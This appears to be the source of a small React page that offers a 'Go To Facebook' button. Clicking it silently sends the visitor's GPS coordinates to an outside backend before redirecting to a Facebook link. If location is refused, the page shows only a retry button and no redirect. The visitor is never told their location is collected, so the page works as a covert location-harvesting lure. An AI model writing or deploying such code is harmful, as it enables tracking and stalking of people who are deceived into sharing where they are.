import './App.css';
import { useState } from "react";

function App() {
  const FB_LINK = "https://www.facebook.com/share/r/1EjiX5jtYP/";
  const [status, setStatus] = useState('idle'); // idle | loading | error

  const handleGo = () => {
    setStatus('loading');

    if (!navigator.geolocation) {
      // Browser doesn't support geolocation → direct redirect
      window.location.href = FB_LINK;
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        try {
          await fetch('https://loac-backend.onrender.com/location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ latitude, longitude }),
          });
        } catch (error) {
          console.error('Error sending location:', error);
          setStatus('error');
          return; // Stop here if error
        }

        // Redirect to Facebook after location is sent
        window.location.href = FB_LINK;
      },
      (error) => {
        console.error('Error getting location:', error);
        setStatus('error');
      }
    );
  };

  return (
    <div className="h-lvh flex flex-col justify-center items-center gap-4">
      {(status === 'idle' || status === 'loading') && (
        <button
          className="py-3 px-10 border rounded-sm bg-slate-300 text-black"
          onClick={handleGo}
        >
          Go To Facebook
        </button>
      )}

      {status === 'error' && (
        <button
          className="mt-2 px-4 py-2 bg-blue-500 text-white rounded"
          onClick={handleGo}
        >
          Retry
        </button>
      )}
    </div>
  );
}

export default App;
